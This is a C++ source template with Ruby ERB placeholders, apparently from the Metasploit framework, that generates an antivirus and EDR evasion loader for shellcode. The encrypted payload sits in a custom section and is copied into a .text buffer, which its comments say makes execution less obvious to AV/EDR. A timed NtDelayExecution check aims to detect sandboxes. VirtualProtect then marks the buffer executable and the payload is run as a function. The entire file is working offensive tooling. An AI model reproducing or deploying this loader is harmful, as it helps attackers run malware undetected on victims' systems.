#include <iostream>
#include <windows.h>

#include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'rc4.h') %>"

#include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"

// Create a class that will perform compile-time obfuscation of payload, that will be stored in custom section.
// After template runs, the payload gets decrypted in memory and copied into a variable located in .text section.
auto tmpPayload __attribute__((used)) __attribute__((section("<%= section_name %>"))) = <%= payload_declaration %>;

// A storage for final decrypted payload. It is specifically stored in .text section as it seems to make execution less obvious to AV/EDR when it's being executed from .text section.
char __attribute__((section(".text"))) finalPayload[<%= payload_length %>];


int PlayDeadForDefender()
{

    DWORD               dwMilliSeconds        = <%=  random_sleep %>;
	  LARGE_INTEGER       DelayInterval         = { 0 }; 
	  LONGLONG            Delay                 = 0; 
    NTSTATUS            STATUS                = 0;
    DWORD               _T0                   = 0, 
                        _T1                   = 0;
        
    Delay = dwMilliSeconds * 10000;
	  DelayInterval.QuadPart = - Delay;

    _T0 = GetTickCount();
    
    STATUS = CALL_EXPORT_X86("ntdll.dll", "NtDelayExecution", int(*)(BOOLEAN, PLARGE_INTEGER), FALSE, &DelayInterval);
    if (STATUS != 0) {
      return 0;
    }
    
    _T1 = GetTickCount();

    if (_T1 - _T0 < dwMilliSeconds) {
        return 0;
    }

    return 1;
}


int main() {

    DWORD dwOldProtect;
    unsigned long scsize;

    scsize = <%= payload_length %>;
    
    if( !CALL(&PlayDeadForDefender) )
    {
      return 1;
    }

    if(!VirtualProtect(finalPayload, scsize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
    {
      return 1;
    }

    memcpy(finalPayload, tmpPayload, scsize);

    if(!VirtualProtect(finalPayload, scsize, PAGE_EXECUTE_READ, &dwOldProtect))
    {
      return 1;
    }
    
    char * payload_fnc = (char*)finalPayload;
	
    (*(void (*)()) payload_fnc)();

	  return 0;
}

